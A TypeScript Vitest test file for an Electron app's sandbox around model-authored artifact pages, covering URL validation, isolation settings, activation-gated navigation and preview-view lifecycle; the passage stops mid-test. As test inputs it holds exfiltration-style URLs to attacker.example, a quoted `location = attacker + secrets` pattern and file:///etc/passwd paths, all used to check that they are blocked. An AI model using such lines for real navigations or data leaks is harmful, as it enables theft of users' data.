import type { AnnotationCommentAction } from '@rally/contracts';
import { EventEmitter } from 'node:events';
import { describe, expect, it, vi } from 'vitest';

import {
  ArtifactPreviewController,
  applyGlobalNavigationPolicy,
  artifactPageAnnotations,
  artifactPartition,
  artifactWebPreferences,
  clampBounds,
  ArtifactUserActivation,
  confineToArtifactOrigin,
  isArtifactUrl,
  loadArtifactDocument,
  loadArtifactInitialUrl,
  TRANSIENT_ACTIVATION_LIFESPAN_MS,
  type ArtifactDocumentContents,
  type PreviewBounds,
} from './artifact-viewers';

describe('the global navigation fence handoff', () => {
  it('defers artifact navigation before preventing it', () => {
    const preventDefault = vi.fn();
    const openExternal = vi.fn();
    applyGlobalNavigationPolicy({
      event: { preventDefault },
      url: `${ORIGIN}/__rally/redeem`,
      artifactSurface: true,
      rendererAllowed: () => false,
      externalAllowed: () => true,
      openExternal,
    });

    expect(preventDefault).not.toHaveBeenCalled();
    expect(openExternal).not.toHaveBeenCalled();
  });

  it('still blocks and hands an ordinary external navigation to the browser', () => {
    const preventDefault = vi.fn();
    const openExternal = vi.fn();
    applyGlobalNavigationPolicy({
      event: { preventDefault },
      url: 'https://example.test/',
      artifactSurface: false,
      rendererAllowed: () => false,
      externalAllowed: () => true,
      openExternal,
    });

    expect(preventDefault).toHaveBeenCalledOnce();
    expect(openExternal).toHaveBeenCalledWith('https://example.test/');
  });
});

const DOMAIN = 'rallyusercontent.test';
const ARTIFACT = '3f2504e0-4f89-41d3-9a0c-0305e82c3301';
const OTHER_ARTIFACT = '00000000-0000-4000-8000-000000000002';
const ORIGIN = `https://${ARTIFACT}-g.${DOMAIN}`;

describe('what the main process will load into an artifact surface', () => {
  it('accepts an artifact origin on the serving domain', () => {
    expect(isArtifactUrl(`${ORIGIN}/`, DOMAIN)).toBe(true);
    expect(isArtifactUrl(`${ORIGIN}/__rally/open#code`, DOMAIN)).toBe(true);
  });

  it('refuses a lookalike domain that merely contains the serving domain', () => {
    // Matched on a label boundary, so a suffix attack does not pass.
    expect(isArtifactUrl(`https://${DOMAIN}.evil.test/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://not${DOMAIN}/`, DOMAIN)).toBe(false);
  });

  it('refuses unrecognized and nested labels inside the serving domain', () => {
    expect(isArtifactUrl(`https://arbitrary.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://foo.bar.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://${DOMAIN}/`, DOMAIN)).toBe(false);
  });

  it('refuses the application, the API, and anything not https', () => {
    // This function is the whole capability the renderer does not get: pointing
    // an artifact surface at Rally's own origin would put model-authored code
    // where the app's cookies are.
    expect(isArtifactUrl('https://rallywith.ai/app', DOMAIN)).toBe(false);
    expect(isArtifactUrl('https://api.rallywith.ai/', DOMAIN)).toBe(false);
    expect(isArtifactUrl(`http://${ARTIFACT}-g.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`file:///etc/passwd`, DOMAIN)).toBe(false);
    expect(isArtifactUrl('app://rallywithai/index.html', DOMAIN)).toBe(false);
    expect(isArtifactUrl('not a url', DOMAIN)).toBe(false);
  });
});

describe('the preview rectangle', () => {
  const window = { width: 1_200, height: 800 };

  it('passes a rectangle that already fits', () => {
    expect(clampBounds({ x: 900, y: 100, width: 280, height: 400 }, window))
      .toEqual({ x: 900, y: 100, width: 280, height: 400 });
  });

  it('clamps a rectangle that would cover the whole window', () => {
    // The renderer measures this, so it is a request rather than an
    // instruction: a wrong one must not paint artifact content over the chrome
    // a person needs to escape it.
    expect(clampBounds({ x: 900, y: 100, width: 5_000, height: 5_000 }, window))
      .toEqual({ x: 900, y: 100, width: 300, height: 700 });
  });

  it('clamps negative and out-of-window origins', () => {
    expect(clampBounds({ x: -50, y: -50, width: 100, height: 100 }, window))
      .toEqual({ x: 0, y: 0, width: 100, height: 100 });
    expect(clampBounds({ x: 9_000, y: 9_000, width: 100, height: 100 }, window))
      .toEqual({ x: 1_200, y: 800, width: 0, height: 0 });
  });

  it('rounds rather than passing fractional pixels through', () => {
    expect(clampBounds({ x: 10.4, y: 10.6, width: 100.5, height: 100.4 }, window))
      .toEqual({ x: 10, y: 11, width: 101, height: 100 });
  });

  it('converts CSS-pixel bounds through the renderer zoom before clamping', () => {
    expect(clampBounds({ x: 400, y: 80, width: 320, height: 240 }, window, 1.25))
      .toEqual({ x: 500, y: 100, width: 400, height: 300 });
    expect(clampBounds({ x: 400, y: 80, width: 320, height: 240 }, { width: 800, height: 600 }, 0.8))
      .toEqual({ x: 320, y: 64, width: 256, height: 192 });
  });
});

describe('the isolation contract both surfaces share', () => {
  it('gives artifact content no preload, no Node, and a sandbox', () => {
    const preferences = artifactWebPreferences(ARTIFACT, true);
    // A preload is a capability, and model-authored content is the last content
    // that should hold one.
    expect(preferences).not.toHaveProperty('preload');
    expect(preferences.nodeIntegration).toBe(false);
    expect(preferences.sandbox).toBe(true);
    expect(preferences.contextIsolation).toBe(true);
    expect(preferences.webSecurity).toBe(true);
    expect(preferences.allowRunningInsecureContent).toBe(false);
  });

  it('closes DevTools outside development', () => {
    expect(artifactWebPreferences(ARTIFACT, true).devTools).toBe(false);
    expect(artifactWebPreferences(ARTIFACT, false).devTools).toBe(true);
  });

  it('partitions per artifact, and shares that partition between both surfaces', () => {
    // Per artifact so one cannot read another's storage; shared between the
    // rail preview and the pop-out so a person authorizes once.
    expect(artifactPartition(ARTIFACT)).toBe(`persist:artifact-${ARTIFACT}`);
    expect(artifactPartition(ARTIFACT)).not.toBe(artifactPartition('other'));
    expect(artifactWebPreferences(ARTIFACT, true).partition).toBe(artifactPartition(ARTIFACT));
  });
});

describe('confining a surface to its artifact', () => {
  /**
   * A surface plus the handoff it is confined with. `activated` is a plain
   * mutable flag rather than a clock: what each case below is about is what the
   * fence does with an answer, and `ArtifactUserActivation` is where the answer
   * itself is tested.
   */
  function contents(activated = false) {
    const opened: string[] = [];
    const shownHere: string[] = [];
    const handoff = {
      // Spends the press, as the real tracker does: these cases are about what
      // the fence does with an answer, and one of them is about asking twice.
      takeActivation: () => { const had = activated; activated = false; return had; },
      externalAllowed: (url: string) => new URL(url).protocol === 'https:',
      openExternal: (url: string) => { opened.push(url); },
      navigateInPlace: (url: string) => { shownHere.push(url); },
    };
    const handlers: {
      navigate?: (event: { preventDefault(): void }, url: string) => void;
      redirect?: (event: { preventDefault(): void }, url: string) => void;
    } = {};
    let windowOpen: ((details: { url: string }) => { action: 'deny' }) | null = null;
    let permission: ((c: unknown, p: string, cb: (allowed: boolean) => void) => void) | null = null;
    return {
      handlers,
      handoff,
      opened,
      shownHere,
      activate: (on: boolean) => { activated = on; },
      openWindow: (url: string) => windowOpen?.({ url }),
      requestPermission: (name: string) => {
        const answers: boolean[] = [];
        permission?.(null, name, (allowed) => answers.push(allowed));
        return answers;
      },
      stub: {
        on(
          event: 'will-navigate' | 'will-redirect',
          handler: (event: { preventDefault(): void }, url: string) => void,
        ) {
          if (event === 'will-navigate') handlers.navigate = handler;
          else handlers.redirect = handler;
        },
        setWindowOpenHandler(handler: (details: { url: string }) => { action: 'deny' }) {
          windowOpen = handler;
        },
        session: {
          setPermissionRequestHandler(
            handler: (c: unknown, p: string, cb: (allowed: boolean) => void) => void,
          ) {
            permission = handler;
          },
        },
      },
    };
  }

  it('lets the artifact navigate within its own origin', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    const event = { preventDefault: vi.fn() };
    surface.handlers.navigate?.(event, `${ORIGIN}/about`);
    expect(event.preventDefault).not.toHaveBeenCalled();
  });

  it('refuses an unactivated off-origin navigation and hands it to nobody', () => {
    // A URL an artifact composes is a URL model-authored code chose, and
    // `location = "https://attacker/?" + secrets` is a navigation the CSP's
    // connect-src and form-action do not touch. With nobody pressing anything,
    // opening it would make Rally perform the exfiltration the egress fence
    // exists to prevent.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    for (const url of ['https://example.com/docs', `https://other-g.${DOMAIN}/`, 'https://rallywith.ai/app']) {
      const event = { preventDefault: vi.fn() };
      surface.handlers.navigate?.(event, url);
      expect(event.preventDefault, url).toHaveBeenCalled();
    }
    expect(surface.opened).toEqual([]);
  });

  it('hands an off-origin link to the browser when a person just pressed something', () => {
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    const event = { preventDefault: vi.fn() };
    surface.handlers.navigate?.(event, 'https://example.com/docs');

    // Prevented *and* handed off: the preview must not follow the link itself,
    // because then a person would be looking at a page that is not the artifact
    // inside a pane that says it is.
    expect(event.preventDefault).toHaveBeenCalledOnce();
    expect(surface.opened).toEqual(['https://example.com/docs']);
  });

  it('spends the press on the first departure, so one click is not a loop of them', () => {
    // Model-authored code answering one click with a loop of `window.open`
    // calls would otherwise put an unbounded number of URLs — and so an
    // unbounded amount of what the page can see — through the system opener.
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    for (let index = 0; index < 5; index += 1) {
      surface.openWindow(`https://attacker.example/?chunk=${index}`);
    }

    expect(surface.opened).toEqual(['https://attacker.example/?chunk=0']);
  });

  it('leaves the press unspent when the navigation is refused for another reason', () => {
    // A blocked scheme must not cost somebody the click they were about to use
    // on the link beside it.
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    surface.handlers.navigate?.({ preventDefault: vi.fn() }, 'file:///etc/passwd');
    surface.handlers.navigate?.({ preventDefault: vi.fn() }, 'https://example.com/docs');

    expect(surface.opened).toEqual(['https://example.com/docs']);
  });

  it('does not spend the press on a refused redirect', () => {
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    surface.handlers.redirect?.({ preventDefault: vi.fn() }, 'https://attacker.example/leak');
    surface.handlers.navigate?.({ preventDefault: vi.fn() }, 'https://example.com/docs');

    expect(surface.opened).toEqual(['https://example.com/docs']);
  });

  it('refuses a scheme the process will not hand to the system opener, activated or not', () => {
    // The gate is activation *and* the scheme policy. A press does not make
    // `file:///` or a registered custom URI handler safe to launch.
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    const event = { preventDefault: vi.fn() };
    surface.handlers.navigate?.(event, 'file:///etc/passwd');

    expect(event.preventDefault).toHaveBeenCalledOnce();
    expect(surface.opened).toEqual([]);
  });

  it('refuses an off-origin redirect even under activation', () => {
    // A redirect is not a click: the destination of a 302 is not the URL the
    // person chose, and a model-authored handler answers requests on this
    // origin, so honouring activation here would hand the gate back to the page.
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    const event = { preventDefault: vi.fn() };
    surface.handlers.redirect?.(event, 'https://attacker.example/leak');

    expect(event.preventDefault).toHaveBeenCalledOnce();
    expect(surface.opened).toEqual([]);
  });

  it('allows same-origin redirects and refuses redirects that leave the artifact', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    const sameOrigin = { preventDefault: vi.fn() };
    surface.handlers.redirect?.(sameOrigin, `${ORIGIN}/__rally/redeem`);
    expect(sameOrigin.preventDefault).not.toHaveBeenCalled();

    const offOrigin = { preventDefault: vi.fn() };
    surface.handlers.redirect?.(offOrigin, 'https://attacker.example/leak');
    expect(offOrigin.preventDefault).toHaveBeenCalledOnce();
  });

  it('never opens a second artifact window, and leaks nothing through an unactivated window.open', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    expect(surface.openWindow('https://example.com')).toEqual({ action: 'deny' });
    expect(surface.opened).toEqual([]);
  });

  it('sends an activated target=_blank link to the browser without making a window', () => {
    const surface = contents(true);
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    expect(surface.openWindow('https://example.com')).toEqual({ action: 'deny' });
    expect(surface.opened).toEqual(['https://example.com']);
    expect(surface.shownHere).toEqual([]);
  });

  it('shows a same-origin target=_blank page in this surface rather than dropping it', () => {
    // An in-site `<a href="/docs" target="_blank">` is an ordinary link. There
    // is no second window to give it, and the browser would open it without the
    // viewer session — 401 on a protected site — so it is shown here.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    expect(surface.openWindow(`${ORIGIN}/docs`)).toEqual({ action: 'deny' });

    expect(surface.shownHere).toEqual([`${ORIGIN}/docs`]);
    // No press was needed and none was spent: in-place same-origin navigation
    // is a power the page already has through `location`.
    expect(surface.opened).toEqual([]);
  });

  it('denies every permission request outright', () => {
    // A camera prompt that appears to come from Rally is worse than one that
    // never appears.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
    for (const permission of ['media', 'geolocation', 'notifications', 'clipboard-read']) {
      expect(surface.requestPermission(permission), permission).toEqual([false]);
    }
  });
});

describe('a surface’s transient user activation', () => {
  function clock(start = 1_000) {
    let now = start;
    return { now: () => now, advance: (ms: number) => { now += ms; } };
  }

  it('starts inactive, so a page that navigates itself on load is handed nowhere', () => {
    expect(new ArtifactUserActivation(clock().now).active()).toBe(false);
  });

  it('counts a press and ignores a cursor passing over the page', () => {
    const time = clock();
    const activation = new ArtifactUserActivation(time.now);

    for (const passive of ['mouseMove', 'mouseEnter', 'mouseLeave', 'mouseWheel', 'gestureScrollBegin']) {
      activation.record(passive);
      expect(activation.active(), passive).toBe(false);
    }

    activation.record('mouseDown');
    expect(activation.active()).toBe(true);
  });

  it('arms on the events HTML calls activation-triggering, and on no others', () => {
    for (const triggering of ['mouseDown', 'pointerDown', 'keyDown', 'rawKeyDown', 'touchEnd', 'gestureTap']) {
      const activation = new ArtifactUserActivation(clock().now);
      activation.record(triggering);
      expect(activation.active(), triggering).toBe(true);
    }

    // A release whose press happened somewhere else, a text event, a touch that
    // may still be cancelled, and a pointer release we cannot tell from a mouse
    // one: each would make this gate wider than the rule it reconstructs.
    for (const inert of ['mouseUp', 'keyUp', 'char', 'touchStart', 'touchCancel', 'pointerUp', 'contextMenu']) {
      const activation = new ArtifactUserActivation(clock().now);
      activation.record(inert);
      expect(activation.active(), inert).toBe(false);
    }
  });

  it('drops the press when the document that received it goes', () => {
    // Otherwise a click on an in-site link stays live across the navigation it
    // caused, and the next document's `onload` spends somebody's click on a
    // destination they never saw. A same-origin navigation does not consume the
    // activation, so this is the only thing standing between the two documents.
    const time = clock();
    const activation = new ArtifactUserActivation(time.now);
    activation.record('mouseDown');
    activation.reset();

    expect(activation.active()).toBe(false);
    expect(activation.take()).toBe(false);
  });

  it('expires with the browser’s own activation lifespan', () => {
    const time = clock();
    const activation = new ArtifactUserActivation(time.now);
    activation.record('keyDown');

    time.advance(TRANSIENT_ACTIVATION_LIFESPAN_MS);
    expect(activation.active()).toBe(true);
    time.advance(1);
    // A click five seconds ago is not the click that started this navigation;
    // a page that waited out the window is navigating on its own account.
    expect(activation.active()).toBe(false);
  });

  it('reports a press once and spends it', () => {
    const time = clock();
    const activation = new ArtifactUserActivation(time.now);
    activation.record('mouseDown');

    expect(activation.take()).toBe(true);
    expect(activation.take()).toBe(false);
    expect(activation.active()).toBe(false);

    // The next press re-arms it: a person who clicks again has asked again.
    activation.record('mouseDown');
    expect(activation.take()).toBe(true);
  });

  it('reads a clock that moved backwards as inactive, not as a permanent activation', () => {
    const time = clock();
    const activation = new ArtifactUserActivation(time.now);
    activation.record('mouseDown');
    time.advance(-60_000);

    expect(activation.active()).toBe(false);
  });
});

describe('the page annotation API over executeJavaScript', () => {
  /** A page as `executeJavaScript` would answer, with or without the API. */
  function page(api: { pick?: unknown; comments?: unknown; rect?: unknown } | null) {
    const calls: string[] = [];
    const execute = async (code: string): Promise<unknown> => {
      calls.push(code);
      if (code.startsWith('typeof globalThis.rallyAnnotations')) return api !== null;
      if (api === null) return null;
      if (code.includes('.pick()')) return api.pick;
      if (code.includes('.comments(')) return api.comments;
      if (code.includes('.rect(')) return api.rect;
      return undefined;
    };
    return { calls, api: artifactPageAnnotations(execute) };
  }
  const pin = { css: 'main > button:nth-of-type(1)', box: { x: 0, y: 0, w: 0.5, h: 0.1 }, visibleText: 'RSVP', html: '<button>RSVP</button>', pagePath: '/', replace: false };

  it('reads ready, a pin, a comment action and a rectangle from the page', async () => {
    const { api, calls } = page({ pick: pin, comments: { id: 'one', action: 'edit', point: { x: 1, y: 2 } }, rect: { x: 1, y: 2, width: 30, height: 40, viewportWidth: 800, viewportHeight: 600 } });
    expect(await api.ready()).toBe(true);
    expect(await api.pick()).toEqual(pin);
    expect(await api.comments([])).toEqual({ id: 'one', action: 'edit', point: { x: 1, y: 2 } });
    expect(await api.rect(pin.css)).toMatchObject({ width: 30, viewportWidth: 800 });
    // The selector travels as a JSON literal, so quotes in it cannot end the call.
    expect(calls.at(-1)).toContain(JSON.stringify(pin.css));
  });

  it('reads a page the Worker did not serve as not ready, with nothing to pick', async () => {
    const { api } = page(null);
    expect(await api.ready()).toBe(false);
    expect(await api.pick()).toBeNull();
    expect(await api.comments([])).toBeNull();
    expect(await api.rect('p')).toBeNull();
  });

  it('refuses a pin the page shaped wrongly rather than passing it on', async () => {
    const { api } = page({ pick: { ...pin, box: { x: 2, y: 0, w: 1, h: 1 } } });
    await expect(api.pick()).rejects.toThrow();
  });
});

describe('the rail preview controller', () => {
  function harness(
    servingDomain = DOMAIN,
    loadFailure: Error | null = null,
    load?: (url: string) => Promise<void>,
    zoom = 1,
    comments?: () => Promise<AnnotationCommentAction | null>,
    ready?: () => Promise<boolean>,
  ) {
    const views: {
      url: string | null;
      bounds: PreviewBounds[];
      radii: number[];
      visible: boolean[];
      closed: boolean;
      destroyed: boolean;
    }[] = [];
    const removed: unknown[] = [];
    // Both surfaces can be destroyed by Electron rather than by this
    // controller, so the harness lets a test say so.
    const host = { destroyed: false };
    const controller = new ArtifactPreviewController(
      {
        destroyed: () => host.destroyed,
        contentSize: () => ({ width: 1_200, height: 800 }),
        zoomFactor: () => zoom,
        removeView: (view) => removed.push(view),
      },
      servingDomain,
      () => {
        const state = {
          url: null as string | null,
          bounds: [] as PreviewBounds[],
          radii: [] as number[],
          visible: [] as boolean[],
          closed: false,
          destroyed: false,
        };
        views.push(state);
        return {
          // Electron owns a window's view tree: destroying the window destroys
          // every view under it, so the fake cannot let one outlive the other.
          destroyed: () => host.destroyed || state.destroyed,
          setBounds: (bounds: PreviewBounds) => state.bounds.push(bounds),
          setBorderRadius: (radius: number) => state.radii.push(radius),
          setVisible: (visible: boolean) => state.visible.push(visible),
          load: async (url: string) => {
            state.url = url;
            return await loadArtifactInitialUrl(async () => {
              if (load) return await load(url);
              if (loadFailure) throw loadFailure;
            });
          },
          comments,
          ready,
          capture: async () => `still of ${state.url ?? 'nothing'}`,
          close: () => { state.closed = true; },
        };
      },
    );
    return { controller, views, removed, host };
  }

  const bounds = { x: 900, y: 100, width: 280, height: 400 };

  it('presents an artifact and positions it over the rail', async () => {
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(true);
    expect(views).toHaveLength(1);
    expect(views[0]?.url).toBe(`${ORIGIN}/`);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
  });

  it('reports a page ready only once it is shown and carries the API', async () => {
    const {controller}=harness(DOMAIN,null,undefined,1,undefined,async()=>true);
    expect(await controller.ready()).toBe(false);
    await controller.present({artifactId:ARTIFACT,url:`${ORIGIN}/`,bounds,cornerRadius:16});
    expect(await controller.ready()).toBe(true);
    const bare=harness(DOMAIN,null,undefined,1,undefined,async()=>false);
    await bare.controller.present({artifactId:ARTIFACT,url:`${ORIGIN}/`,bounds,cornerRadius:16});
    expect(await bare.controller.ready()).toBe(false);
  });

  it('discards a comment action after the native view has been replaced', async () => {
    let answer: ((action: AnnotationCommentAction) => void) | undefined;
    const {controller}=harness(DOMAIN,null,undefined,1,()=>new Promise((resolve)=>{answer=resolve;}));
    await controller.present({artifactId:ARTIFACT,url:`${ORIGIN}/`,bounds,cornerRadius:16});
    const action=controller.comments([]);
    await controller.present({artifactId:OTHER_ARTIFACT,url:`https://${OTHER_ARTIFACT}-g.${DOMAIN}/`,bounds,cornerRadius:16});
    answer?.({id:'old-pin',action:'remove'});
    expect(await action).toBeNull();
  });

  it('rounds the view once, to the corner its host drew, and not on every scroll', async () => {
    // The view reaches the bottom corners of the dialog holding it, and CSS
    // cannot round a native view. The corner belongs to the surface rather
    // than to a layout: `setBounds` runs on every scroll frame.
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(true);
    controller.setBounds({ ...bounds, y: 40 });
    controller.setBounds({ ...bounds, y: 80 });
    expect(views[0]?.radii).toEqual([16]);
  });

  it('refuses a URL that is not an artifact, and creates nothing', async () => {
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: 'https://rallywith.ai/app', bounds, cornerRadius: 16 })).toBe(false);
    expect(views).toHaveLength(0);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('reports a failed navigation and removes the empty composited view', async () => {
    const { controller, views, removed } = harness(DOMAIN, new Error('ERR_NAME_NOT_RESOLVED'));
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(false);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('keeps the view when the bootstrap replaces its load with redemption', async () => {
    const aborted = Object.assign(new Error('ERR_ABORTED (-3)'), { code: 'ERR_ABORTED', errno: -3 });
    const { controller, views, removed } = harness(DOMAIN, aborted);
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/__rally/open#code`, bounds, cornerRadius: 16 }))
      .toBe(true);
    expect(views[0]?.closed).toBe(false);
    expect(removed).toHaveLength(0);
  });

  it('keeps the view hidden, at the pane’s size, until the artifact’s own document is ready', async () => {
    // The access URL lands on the redeem bootstrap, which has its own
    // "Opening…". Shown from the start, it painted over the rail's placeholder:
    // two loading looks for one open. Hidden by collapsing instead, the site's
    // startup scripts measured a 0×0 viewport and a chart sized once stayed empty.
    let finishLoad!: () => void;
    const loading = new Promise<void>((resolve) => { finishLoad = resolve; });
    const { controller, views } = harness(DOMAIN, null, async () => await loading);
    const presented = controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/__rally/open#code`, bounds, cornerRadius: 16 });
    expect(views[0]?.visible).toEqual([false]);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
    finishLoad();
    expect(await presented).toBe(true);
    expect(views[0]?.visible).toEqual([false, true]);
  });

  it('makes concurrent presenters await the same failed initial load', async () => {
    let rejectLoad!: (error: Error) => void;
    const load = new Promise<void>((_resolve, reject) => { rejectLoad = reject; });
    const { controller, views, removed } = harness(DOMAIN, null, async () => await load);
    const first = controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    const second = controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    expect(views).toHaveLength(1);
    rejectLoad(new Error('ERR_NAME_NOT_RESOLVED'));
    await expect(Promise.all([first, second])).resolves.toEqual([false, false]);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
  });

  it('keeps at most one view per window, reusing it for the same artifact', async () => {
    // Two would mean two artifacts painting over one rectangle, and the one
    // underneath would still be running.
    const { controller, views } = harness();
    await Promise.all([
      controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 }),
      controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 }),
    ]);
    expect(views).toHaveLength(1);
    expect(views[0]?.closed).toBe(false);
  });

  it('replaces the view when the artifact changes', async () => {
    const { controller, views, removed } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    await controller.present({
      artifactId: OTHER_ARTIFACT,
      url: `https://${OTHER_ARTIFACT}-g.${DOMAIN}/`,
      bounds,
      cornerRadius: 16,
    });
    expect(views).toHaveLength(2);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBe(OTHER_ARTIFACT);
  });

  it('collapses to nothing while an app overlay is open, and restores after', async () => {
    // A WebContentsView composites above the renderer's DOM, so a dialog or the
    // command palette would otherwise be painted over by artifact content.
    const { controller, views } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    controller.setOverlayOpen(true);
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 0, y: 0, width: 0, height: 0 });
    controller.setOverlayOpen(false);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
    // Collapsed rather than destroyed: the page keeps its state, so closing a
    // dialog restores what the person was looking at.
    expect(views[0]?.closed).toBe(false);
    expect(views).toHaveLength(1);
  });

  it('takes a still of the live page, and none once there is no page to take', async () => {
    const { controller } = harness();
    expect(await controller.snapshot()).toBeNull();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    expect(await controller.snapshot()).toBe(`still of ${ORIGIN}/`);
    controller.destroy();
    expect(await controller.snapshot()).toBeNull();
  });

  it('takes no still while the page is still loading behind the rail', async () => {
    let finish: () => void = () => undefined;
    const { controller } = harness(DOMAIN, null, async () => await new Promise<void>((resolve) => { finish = resolve; }));
    const presented = controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    expect(await controller.snapshot()).toBeNull();
    finish();
    await presented;
    expect(await controller.snapshot()).toBe(`still of ${ORIGIN}/`);
  });

  it('stays hidden through a layout change while an overlay is open', async () => {
    const { controller, views } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    controller.setOverlayOpen(true);
    controller.setBounds({ x: 500, y: 50, width: 400, height: 500 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 0, y: 0, width: 0, height: 0 });
  });

  it('clamps a layout update to the window', async () => {
    const { controller, views } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    controller.setBounds({ x: 900, y: 100, width: 9_000, height: 9_000 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 900, y: 100, width: 300, height: 700 });
  });

  it('places the view in window points when the renderer is zoomed', async () => {
    const { controller, views } = harness(DOMAIN, null, undefined, 1.25);
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(true);
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 1_125, y: 125, width: 75, height: 500 });
    controller.setBounds({ x: 400, y: 80, width: 320, height: 240 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 500, y: 100, width: 400, height: 300 });
  });

  it('destroys the view and forgets the artifact', async () => {
    const { controller, views, removed } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    controller.destroy();
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBeNull();
    // Idempotent: a second close must not remove a view twice.
    controller.destroy();
    expect(removed).toHaveLength(1);
  });

  it('touches nothing when the window it was composited over is already gone', async () => {
    const { controller, views, removed, host } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    // How quitting to install an update reaches this controller: Electron
    // destroys the window, and the window's own `closed` handler tears the
    // preview down afterwards. Detaching or closing anything here throws
    // `Object has been destroyed` out of an event handler, which the main
    // process reports as an uncaught exception instead of quitting.
    host.destroyed = true;
    controller.destroy();
    expect(removed).toHaveLength(0);
    expect(views[0]?.closed).toBe(false);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('detaches a view whose contents closed themselves, without closing it again', async () => {
    const { controller, views, removed } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    views[0]!.destroyed = true;
    controller.destroy();
    // The window is still alive and still holding the child, so the detach has
    // to happen; only the second close would throw.
    expect(removed).toHaveLength(1);
    expect(views[0]?.closed).toBe(false);
    // Idempotent here too. This is the path where it is not obvious: the
    // window is alive, so nothing else would stop a second detach.
    controller.destroy();
    expect(removed).toHaveLength(1);
  });

  it('replaces a view whose contents closed themselves rather than reporting it live', async () => {
    const { controller, views, removed } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(true);
    // An artifact page calling `window.close()`. The handle stays, and it is
    // still this artifact's, so the artifact-ID comparison alone would keep it.
    views[0]!.destroyed = true;
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(true);
    expect(views).toHaveLength(2);
    expect(views[1]?.url).toBe(`${ORIGIN}/`);
    expect(views[1]?.bounds.at(-1)).toEqual(bounds);
    // The dead one is detached from the window that is still holding it.
    expect(removed).toHaveLength(1);
  });

  it('stops laying out a view whose contents closed themselves', async () => {
    const { controller, views } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    const laidOut = views[0]!.bounds.length;
    // The window is alive, so the window half of the layout guard does not
    // apply. The rail goes on sending layout updates — a resize — because it
    // has no way to learn the preview died under it.
    views[0]!.destroyed = true;
    controller.setBounds({ x: 100, y: 100, width: 200, height: 200 });
    controller.setOverlayOpen(true);
